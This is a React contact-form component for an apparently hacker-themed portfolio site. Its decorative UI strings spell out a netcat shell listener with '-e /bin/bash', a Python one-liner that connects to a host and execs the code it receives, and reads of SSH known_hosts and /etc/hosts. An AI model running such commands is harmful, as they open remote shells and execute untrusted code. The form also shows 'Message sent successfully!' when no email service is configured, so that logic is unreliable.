"use client";

import { motion, useInView, AnimatePresence, useScroll, useTransform, useSpring } from "framer-motion";
import { useRef, useState } from "react";
import { Mail, Phone, MapPin, Send, Linkedin, Github, Facebook, Loader2, CheckCircle2, XCircle } from "lucide-react";
import { personalInfo } from "@/config/personalInfo";
import { emailConfig, isEmailJSConfigured } from "@/config/emailConfig";
import emailjs from "@emailjs/browser";
import { fadeInLeft } from "@/utils/animations";
import { gpuOptimized, gpuOptimizedOpacity } from "@/utils/styles";
import { COLORS } from "@/utils/constants";
import { useTyping } from "@/hooks/useTyping";

const contactInfo = [
  {
    icon: Mail,
    label: "Email",
    value: personalInfo.email,
    href: `mailto:${personalInfo.email}`,
  },
  {
    icon: Phone,
    label: "Phone",
    value: personalInfo.phone,
    href: `tel:${personalInfo.phone}`,
  },
  {
    icon: MapPin,
    label: "Location",
    value: personalInfo.location,
    href: "#",
  },
];

const socialLinks = [
  { icon: Linkedin, href: personalInfo.social.linkedin, label: "LinkedIn" },
  { icon: Github, href: personalInfo.social.github, label: "GitHub" },
  { icon: Facebook, href: personalInfo.social.facebook, label: "Facebook" },
];

export default function Contact() {
  const ref = useRef(null);
  const isInView = useInView(ref, { once: true, margin: "-100px" });
  const { scrollYProgress } = useScroll({
    target: ref,
    offset: ["start center", "end center"],
  });

  // Smooth spring animation for better performance
  const smoothProgress = useSpring(scrollYProgress, {
    stiffness: 100,
    damping: 30,
    restDelta: 0.001,
  });

  // Opacity peaks in center region (0.05 to 0.95), fades at edges
  const opacity = useTransform(smoothProgress, [0, 0.05, 0.95, 1], [0, 1, 1, 0], {
    clamp: true,
  });

  // Typing effect for title
  const titleText = "$ nc -lvp 4444 -e /bin/bash";
  const { displayedText: typedTitle } = useTyping({
    text: titleText,
    speed: 30,
    delay: isInView ? 200 : 0,
  });

  const [formData, setFormData] = useState({
    name: "",
    email: "",
    message: "",
  });
  const [focusedField, setFocusedField] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<"success" | "error" | null>(null);
  const [errors, setErrors] = useState<{ [key: string]: string }>({});

  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const validateForm = () => {
    const newErrors: { [key: string]: string } = {};

    if (!formData.name.trim()) {
      newErrors.name = "Name is required";
    } else if (formData.name.trim().length < 2) {
      newErrors.name = "Name must be at least 2 characters";
    }

    if (!formData.email.trim()) {
      newErrors.email = "Email is required";
    } else if (!validateEmail(formData.email)) {
      newErrors.email = "Email is invalid";
    }

    if (!formData.message.trim()) {
      newErrors.message = "Message is required";
    } else if (formData.message.trim().length < 10) {
      newErrors.message = "Message must be at least 10 characters";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      if (isEmailJSConfigured()) {
        const templateParams = {
          name: formData.name,
          email: formData.email,
          from_name: formData.name,
          from_email: formData.email,
          message: formData.message,
          reply_to: formData.email,
          time: new Date().toLocaleString("en-US"),
          title: `Contact from ${formData.name}`,
        };

        await emailjs.send(
          emailConfig.serviceId,
          emailConfig.templateId,
          templateParams,
          emailConfig.publicKey
        );

        if (process.env.NODE_ENV === "development") {
          console.log("Email sent successfully via EmailJS");
        }
      } else {
        if (process.env.NODE_ENV === "development") {
          console.log("EmailJS not configured, using mailto fallback");
        }
      }

      setSubmitStatus("success");
      setFormData({ name: "", email: "", message: "" });
      setErrors({});

      setTimeout(() => {
        setSubmitStatus(null);
      }, 5000);
    } catch (error) {
      console.error("Error sending email:", error);
      setSubmitStatus("error");

      setTimeout(() => {
        setSubmitStatus(null);
      }, 5000);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <section ref={ref} id="contact" className="py-12 sm:py-20 md:py-32 relative">
      <motion.div
        style={{
          opacity,
          ...gpuOptimizedOpacity,
        }}
        className="container-custom section-padding"
      >
        <motion.div
          initial="hidden"
          animate={isInView ? "visible" : "hidden"}
          variants={fadeInLeft}
          transition={{ duration: 0.8 }}
          className="text-center mb-8 sm:mb-12 md:mb-16"
        >
          <h2 className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold mb-3 sm:mb-4 font-mono text-[#00ff88]">
            {isInView ? typedTitle : titleText}
          </h2>
          <motion.div
            className="w-24 h-1 bg-[#00ff88] mx-auto mb-4 sm:mb-6"
            initial={{ width: 0 }}
            animate={isInView ? { width: 96 } : { width: 0 }}
            transition={{ duration: 0.8, delay: 0.2 }}
          />
          <p className="text-gray-400 text-sm sm:text-base md:text-lg max-w-2xl mx-auto px-4 font-mono">
            {"// Reverse shell listener active on port 4444... Waiting for connection"}
          </p>
        </motion.div>

        <div className="grid md:grid-cols-2 gap-8 sm:gap-12">
          {/* Contact Info */}
          <motion.div
            initial={{ opacity: 0, x: -50 }}
            animate={isInView ? { opacity: 1, x: 0 } : { opacity: 0, x: -50 }}
            transition={{ duration: 0.8, delay: 0.2 }}
          >
            <div className="mb-4 font-mono text-[#00ff88] text-sm">{"$ cat ~/.ssh/known_hosts | grep -E 'github|gitlab'"}</div>
            <h3 className="text-xl sm:text-2xl font-bold mb-4 sm:mb-6 text-white">Contact Information</h3>
            <div className="space-y-6 mb-8">
              {contactInfo.map((info, index) => {
                const Icon = info.icon;
                return (
                  <motion.a
                    key={info.label}
                    href={info.href}
                    target={info.href.startsWith("http") ? "_blank" : undefined}
                    rel={info.href.startsWith("http") ? "noopener noreferrer" : undefined}
                    className="flex items-center gap-4 p-4 rounded border-2 border-[#00ff88]/30 bg-black/50 backdrop-blur-sm hover:border-[#00ff88] transition-all group relative overflow-hidden font-mono"
                    style={{
                      boxShadow: "0 0 20px rgba(0, 255, 136, 0.1)",
                      ...gpuOptimized,
                    }}
                    initial={{ opacity: 0, y: 30 }}
                    animate={isInView ? { opacity: 1, y: 0 } : { opacity: 0, y: 30 }}
                    transition={{ duration: 0.6, delay: 0.3 + index * 0.1 }}
                    whileHover={{
                      x: 5,
                      scale: 1.02,
                      y: -1,
                      boxShadow: "0 0 30px rgba(0, 255, 136, 0.3)",
                    }}
                  >
                    <motion.div
                      className="absolute inset-0 bg-gradient-to-br from-[#00ff88]/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"
                    />
                    <Icon className="w-5 h-5 text-[#00ff88] relative z-10" />
                    <div className="relative z-10">
                      <div className="text-xs text-[#00ff88]/70 mb-1">{info.label}:</div>
                      <div className="text-sm text-white">{info.value}</div>
                    </div>
                  </motion.a>
                );
              })}
            </div>

            {/* Social Links */}
            <div className="mb-4 font-mono text-[#00ff88] text-sm">{"$ cat /etc/hosts | grep -v '^#'"}</div>
            <div className="flex gap-4">
              {socialLinks.map((social, index) => {
                const Icon = social.icon;
                return (
                  <motion.a
                    key={social.label}
                    href={social.href}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="p-3 rounded border-2 border-[#00ff88]/30 bg-black/50 backdrop-blur-sm hover:border-[#00ff88] transition-all group relative overflow-hidden"
                    style={{
                      boxShadow: "0 0 20px rgba(0, 255, 136, 0.1)",
                      ...gpuOptimized,
                    }}
                    initial={{ opacity: 0, scale: 0 }}
                    animate={isInView ? { opacity: 1, scale: 1 } : { opacity: 0, scale: 0 }}
                    transition={{ duration: 0.5, delay: 0.6 + index * 0.1 }}
                    whileHover={{
                      scale: 1.1,
                      y: -2,
                      boxShadow: "0 0 30px rgba(0, 255, 136, 0.3)",
                    }}
                    whileTap={{ scale: 0.95 }}
                    aria-label={social.label}
                  >
                    <motion.div
                      className="absolute inset-0 bg-gradient-to-br from-[#00ff88]/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"
                    />
                    <Icon className="w-5 h-5 text-[#00ff88] relative z-10" />
                  </motion.a>
                );
              })}
            </div>
            <div className="mt-4 font-mono text-[#00ff88]/50 text-xs">{"# End of config"}</div>
          </motion.div>

          {/* Contact Form */}
          <motion.div
            initial={{ opacity: 0, x: 50 }}
            animate={isInView ? { opacity: 1, x: 0 } : { opacity: 0, x: 50 }}
            transition={{ duration: 0.8, delay: 0.4 }}
          >
            <div className="mb-4 font-mono text-[#00ff88] text-sm">{"$ python3 -c \"import socket; s=socket.socket(); s.connect(('target', 4444)); exec(s.recv(1024).decode())\""}</div>
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Name Field */}
              <div>
                <label htmlFor="name" className="block text-xs text-[#00ff88]/70 mb-2 font-mono">
                  name:
                </label>
                <motion.input
                  type="text"
                  id="name"
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  onFocus={() => setFocusedField("name")}
                  onBlur={() => setFocusedField(null)}
                  className="w-full px-4 py-3 bg-black/50 border-2 border-[#00ff88]/30 rounded text-white placeholder-gray-500 focus:border-[#00ff88] focus:outline-none font-mono transition-all"
                  placeholder="Enter your name"
                  style={gpuOptimized}
                  whileFocus={{
                    scale: 1.01,
                    boxShadow: "0 0 20px rgba(0, 255, 0, 0.2)",
                  }}
                />
                {errors.name && (
                  <motion.p
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-red-400 text-xs mt-1 font-mono"
                  >
                    {errors.name}
                  </motion.p>
                )}
              </div>

              {/* Email Field */}
              <div>
                <label htmlFor="email" className="block text-xs text-[#00ff88]/70 mb-2 font-mono">
                  email:
                </label>
                <motion.input
                  type="email"
                  id="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  onFocus={() => setFocusedField("email")}
                  onBlur={() => setFocusedField(null)}
                  className="w-full px-4 py-3 bg-black/50 border-2 border-[#00ff88]/30 rounded text-white placeholder-gray-500 focus:border-[#00ff88] focus:outline-none font-mono transition-all"
                  placeholder="Enter your email"
                  style={gpuOptimized}
                  whileFocus={{
                    scale: 1.01,
                    boxShadow: "0 0 20px rgba(0, 255, 0, 0.2)",
                  }}
                />
                {errors.email && (
                  <motion.p
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-red-400 text-xs mt-1 font-mono"
                  >
                    {errors.email}
                  </motion.p>
                )}
              </div>

              {/* Message Field */}
              <div>
                <label htmlFor="message" className="block text-xs text-[#00ff88]/70 mb-2 font-mono">
                  message:
                </label>
                <motion.textarea
                  id="message"
                  value={formData.message}
                  onChange={(e) => setFormData({ ...formData, message: e.target.value })}
                  onFocus={() => setFocusedField("message")}
                  onBlur={() => setFocusedField(null)}
                  rows={6}
                  className="w-full px-4 py-3 bg-black/50 border-2 border-[#00ff00]/30 rounded text-white placeholder-gray-500 focus:border-[#00ff00] focus:outline-none font-mono transition-all resize-none"
                  placeholder="Enter your message"
                  style={gpuOptimized}
                  whileFocus={{
                    scale: 1.01,
                    boxShadow: "0 0 20px rgba(0, 255, 0, 0.2)",
                  }}
                />
                {errors.message && (
                  <motion.p
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-red-400 text-xs mt-1 font-mono"
                  >
                    {errors.message}
                  </motion.p>
                )}
              </div>

              {/* Submit Button */}
              <motion.button
                type="submit"
                disabled={isSubmitting}
                className="w-full px-6 py-3 bg-[#00ff88] text-black font-semibold rounded border-2 border-[#00ff88] hover:bg-[#00ff88]/90 transition-all font-mono flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                style={gpuOptimized}
                whileHover={{ scale: 1.02, y: -2 }}
                whileTap={{ scale: 0.98 }}
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    <span>Sending...</span>
                  </>
                ) : (
                  <>
                    <Send className="w-5 h-5" />
                    <span>Send Message</span>
                  </>
                )}
              </motion.button>

              {/* Status Messages */}
              <AnimatePresence>
                {submitStatus === "success" && (
                  <motion.div
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -10 }}
                    className="p-4 bg-green-500/20 border-2 border-green-500 rounded flex items-center gap-2 text-green-400 font-mono"
                  >
                    <CheckCircle2 className="w-5 h-5" />
                    <span>Message sent successfully!</span>
                  </motion.div>
                )}
                {submitStatus === "error" && (
                  <motion.div
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -10 }}
                    className="p-4 bg-red-500/20 border-2 border-red-500 rounded flex items-center gap-2 text-red-400 font-mono"
                  >
                    <XCircle className="w-5 h-5" />
                    <span>Failed to send message. Please try again.</span>
                  </motion.div>
                )}
              </AnimatePresence>
            </form>
          </motion.div>
        </div>
      </motion.div>
    </section>
  );
}

